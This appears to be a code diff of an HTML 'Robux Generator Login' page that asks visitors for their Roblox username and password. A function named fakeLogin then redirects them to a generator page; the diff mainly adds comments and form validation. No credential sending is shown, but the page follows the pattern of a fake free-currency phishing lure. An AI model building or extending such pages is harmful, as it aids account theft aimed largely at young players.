@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Robux Generator Login</title>
-    <link rel="stylesheet" href="style.css"> 
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
@@ -15,7 +15,7 @@
 <section id="login">
     <h2>Login to Your Roblox Account</h2>
     <p>Enter your Roblox username and password to connect to our generator.</p>
-    <form onsubmit="return fakeLogin()">
+    <form id="loginForm" onsubmit="return fakeLogin()">
         <label for="username">Username:</label>
         <input type="text" id="username" required>
 
@@ -33,17 +33,22 @@
         let password = document.getElementById("password").value;
         let loadingText = document.querySelector(".loading");
         let button = document.querySelector(".btn");
-        
+
+        // Check if both fields are filled
         if (username && password) {
-            button.disabled = true;
-            loadingText.style.display = "block";
-            button.innerText = "Logging in...";
+            button.disabled = true;  // Disable the button to prevent multiple submissions
+            loadingText.style.display = "block";  // Show loading text
+            button.innerText = "Logging in...";  // Change button text
 
             setTimeout(() => {
-                window.location.href = "generator.html"; // Redirect to generator page
-            }, 3000);
+                // Redirect to generator page after a short delay (3 seconds)
+                window.location.href = "generator.html"; 
+            }, 3000);  // Change this time delay as needed
+        } else {
+            alert("Please fill out both fields!");  // Alert if any field is empty
         }
-        return false;
+
+        return false;  // Prevent form submission
     }
 </script>
 
